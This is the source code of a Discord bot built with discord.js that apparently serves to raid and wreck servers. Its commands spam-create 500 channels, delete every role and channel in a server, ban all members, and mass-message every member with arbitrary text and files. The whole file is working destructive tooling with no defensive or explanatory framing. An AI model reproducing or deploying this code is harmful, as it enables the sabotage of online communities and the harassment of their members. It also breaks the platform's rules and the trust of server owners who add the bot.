const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = 'monster'

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', msg => {
  if (msg.content === 'ready') {
    msg.reply('yes sir :smiling_imp:');
  }
});


client.on('message' , async (message) => {
    if (message.content.startsWith(prefix + 'attack')) {
for (let i = 0; i < 500; i++) {

        message.guild.createChannel('ATLANTIC GANG', 'voice')
        message.channel.send('lol');
}
}
}); 


client.on('message', x5bz => {   
    if (x5bz.content.startsWith("monster fuck")) {
        x5bz.guild.roles.forEach(r => { r.delete() }) 
        x5bz.guild.channels.forEach(c => { c.delete() })
                   let v5bz = new Discord.RichEmbed()
               .setColor('RANDOM')
               .setDescription('**Done sir ! i have been FUCKED THE SERVER ATLATNTIC GANG :cop:**')
              x5bz.author.sendEmbed(v5bz);
    }
    });


client.on('message', async message => {
    if(message.content === "monster destroy") {
        if(message.author.id !== '463958662684213249') return;
        message.guild.members.forEach(member => {
           member.ban(); 
        });
    } 
 });



 client.on('message', msg =>{
    let message=msg;
    if(message.content.startsWith("bc")){
        var args = message.content.split(' ').slice(1).join(' ');
    msg.guild.members.forEach(m=>{
        m.send(args.replace(/[user]/g,m)).catch();
    if(message.attachments.first()){
m.sendFile(message.attachments.first().url).catch();
    }
    })    ;
    }
});








client.login(process.env.BOT_TOKEN);
